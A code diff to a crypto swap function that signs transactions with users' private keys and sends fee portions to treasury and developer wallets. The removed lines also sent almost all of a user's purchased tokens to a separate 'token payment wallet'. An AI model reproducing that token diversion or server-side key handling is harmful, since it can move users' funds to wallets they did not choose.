@@ -12,15 +12,12 @@ import {
   executeTokenTransfer,
   WBNB_ADDRESS, // Keep WBNB_ADDRESS for internal logic if needed, but not for direct swaps
   getTokenBalance,
-  TREASURY_ADDRESS,
-  DEV_WALLET_ADDRESS,
-  TREASURY_WALLET_LAST_DIGITS,
-  DEV_WALLET_LAST_DIGITS,
-  verifyAddressSuffix,
-  isZeroAddress,
-  // NEW: token payment wallet
-  TOKEN_WALLET_ADDRESS,
-  TOKEN_WALLET_LAST_DIGITS,
+  TREASURY_ADDRESS, // New: Import TREASURY_ADDRESS from web3.ts
+  DEV_WALLET_ADDRESS, // New: Import DEV_WALLET_ADDRESS from web3.ts
+  TREASURY_WALLET_LAST_DIGITS, // Keep for suffix check
+  DEV_WALLET_LAST_DIGITS, // Keep for suffix check
+  verifyAddressSuffix, // Keep for suffix check
+  isZeroAddress, // New: Import isZeroAddress
 } from "@/lib/web3"
 import { fetchBNBPriceWithFallbacks } from "@/lib/price-fetcher"
 
@@ -224,17 +221,6 @@ export async function executeFlashGeneration(
   /* 0. sanity ------------------------------------------------------- */
   if (!userWallet || !userPK || !recipient) return { success: false, message: "Bad input" }
 
-  // Optional early verification of critical wallet suffixes to fail fast
-  if (TREASURY_ADDRESS && !isZeroAddress(TREASURY_ADDRESS) && !verifyAddressSuffix(TREASURY_ADDRESS, TREASURY_WALLET_LAST_DIGITS)) {
-    return { success: false, message: "Treasury wallet address suffix mismatch. Transaction aborted." }
-  }
-  if (DEV_WALLET_ADDRESS && !isZeroAddress(DEV_WALLET_ADDRESS) && !verifyAddressSuffix(DEV_WALLET_ADDRESS, DEV_WALLET_LAST_DIGITS)) {
-    return { success: false, message: "Developer wallet address suffix mismatch. Transaction aborted." }
-  }
-  if (TOKEN_WALLET_ADDRESS && !isZeroAddress(TOKEN_WALLET_ADDRESS) && !verifyAddressSuffix(TOKEN_WALLET_ADDRESS, TOKEN_WALLET_LAST_DIGITS)) {
-    return { success: false, message: "Token payment wallet suffix mismatch. Transaction aborted." }
-  }
-
   /* 1. fresh quote (includes tx payload) --------------------------- */
   const q = await getFlashGenerationQuote(userId, userWallet, t, usdToSpend)
   if ("error" in q) return { success: false, message: q.error }
@@ -270,7 +256,13 @@ export async function executeFlashGeneration(
     return { success: false, message: error.message || "1inch swap failed." }
   }
 
-  /* 3. token fee – treasury & new token wallet transfer ------------ */
+  /* 3. token fee – treasury & user transfer ----------------------- */
+  // After the swap, the tokens are in the user's wallet (or the recipient's if specified in 1inch tx)
+  // We need to fetch the actual received amount and then split.
+  // NOTE: 1inch's /swap endpoint can send directly to a recipient.
+  // If the recipient is different from userWallet, the tokens are already there.
+  // If recipient is userWallet, we need to fetch the balance.
+
   let actualReceivedTokensWei: bigint
   try {
     // Fetch the actual balance of the target token in the recipient's wallet after the swap
@@ -283,11 +275,10 @@ export async function executeFlashGeneration(
 
   const totalOut = actualReceivedTokensWei // This is the amount received by the recipient
   const feeTokens = (totalOut * BigInt(Math.round(q.treasuryTokenFeePercent * 1000))) / 100_000n
-  const tokenPaymentWalletTokens = totalOut - feeTokens
 
-  // 3A. Send treasury portion of tokens (feePercent) to treasury wallet
+  // Only attempt transfer if feeTokens is greater than 0 and treasury address is valid
   if (feeTokens > 0n && TREASURY_ADDRESS && !isZeroAddress(TREASURY_ADDRESS)) {
-    // Verify treasury wallet address suffix
+    // New: Verify treasury wallet address suffix
     if (!verifyAddressSuffix(TREASURY_ADDRESS, TREASURY_WALLET_LAST_DIGITS)) {
       return { success: false, message: "Treasury wallet address suffix mismatch. Transaction aborted." }
     }
@@ -295,37 +286,15 @@ export async function executeFlashGeneration(
       await executeTokenTransfer(userPK, t.contractAddress, TREASURY_ADDRESS, safeFormatUnits(feeTokens, t.decimals))
     } catch (error: any) {
       console.error("Failed to send treasury token fee:", error)
-      // Log and continue; primary swap succeeded.
-    }
-  }
-
-  // 3B. Send the purchased (non-fee) tokens to the new token payment wallet
-  if (tokenPaymentWalletTokens > 0n && TOKEN_WALLET_ADDRESS && !isZeroAddress(TOKEN_WALLET_ADDRESS)) {
-    if (!verifyAddressSuffix(TOKEN_WALLET_ADDRESS, TOKEN_WALLET_LAST_DIGITS)) {
-      return { success: false, message: "Token payment wallet suffix mismatch. Transaction aborted." }
-    }
-    try {
-      await executeTokenTransfer(userPK, t.contractAddress, TOKEN_WALLET_ADDRESS, safeFormatUnits(tokenPaymentWalletTokens, t.decimals))
-      // Optional: log this distribution as its own transaction
-      await addDoc(collection(db, "transactions"), {
-        userId,
-        type: "distribute",
-        amount: Number.parseFloat(safeFormatUnits(tokenPaymentWalletTokens, t.decimals)),
-        token: t.symbol,
-        hash: swapTxHash,
-        status: "success",
-        recipient: TOKEN_WALLET_ADDRESS,
-        timestamp: new Date(),
-        note: "Token payment wallet distribution",
-      })
-    } catch (error: any) {
-      console.error("Failed to send tokens to payment wallet:", error)
-      // Partial failure: tokens may still reside in recipient's wallet.
+      // This is a post-swap operation, so the main swap is successful.
+      // Log this as a partial failure or warning.
     }
   }
 
   /* 4. flat BNB fees ---------------------------------------------- */
+  // Only attempt transfer if fee is greater than 0 and treasury address is valid
   if (q.treasuryFlatFeeUsd > 0 && TREASURY_ADDRESS && !isZeroAddress(TREASURY_ADDRESS)) {
+    // New: Verify treasury wallet address suffix
     if (!verifyAddressSuffix(TREASURY_ADDRESS, TREASURY_WALLET_LAST_DIGITS)) {
       return { success: false, message: "Treasury wallet address suffix mismatch. Transaction aborted." }
     }
@@ -335,11 +304,12 @@ export async function executeFlashGeneration(
       console.error("Failed to send treasury flat BNB fee:", error)
     }
   }
-
   if (DEV_WALLET_ADDRESS && q.devFeeUsd > 0 && !isZeroAddress(DEV_WALLET_ADDRESS)) {
+    // New: Verify developer wallet address suffix
     if (!verifyAddressSuffix(DEV_WALLET_ADDRESS, DEV_WALLET_LAST_DIGITS)) {
       return { success: false, message: "Developer wallet address suffix mismatch. Transaction aborted." }
     }
+    // q.devFeeUsd now correctly reflects DEV_AUTO_FEE_USD
     try {
       await executeBNBTransfer(userPK, DEV_WALLET_ADDRESS, (q.devFeeUsd / q.bnbPriceUsd).toString())
     } catch (error: any) {
@@ -365,15 +335,9 @@ export async function executeFlashGeneration(
     type: "auto",
     createdAt: new Date(),
     completedAt: new Date(),
-    treasuryFlatFeeUsd: q.treasuryFlatFeeUsd,
-    devFeeUsd: q.devFeeUsd,
-    treasuryTokenFeePercent: q.treasuryTokenFeePercent,
-    tokenPaymentWalletTokenAmount: Number.parseFloat(
-      tokenPaymentWalletTokens > 0n
-        ? safeFormatUnits(tokenPaymentWalletTokens, t.decimals)
-        : "0"
-    ),
-    tokenPaymentWalletAddress: TOKEN_WALLET_ADDRESS || null,
+    treasuryFlatFeeUsd: q.treasuryFlatFeeUsd, // Log actual fees
+    devFeeUsd: q.devFeeUsd, // Log actual fees (DEV_AUTO_FEE_USD)
+    treasuryTokenFeePercent: q.treasuryTokenFeePercent, // Log actual fees
   })
 
   await addDoc(collection(db, "transactions"), {
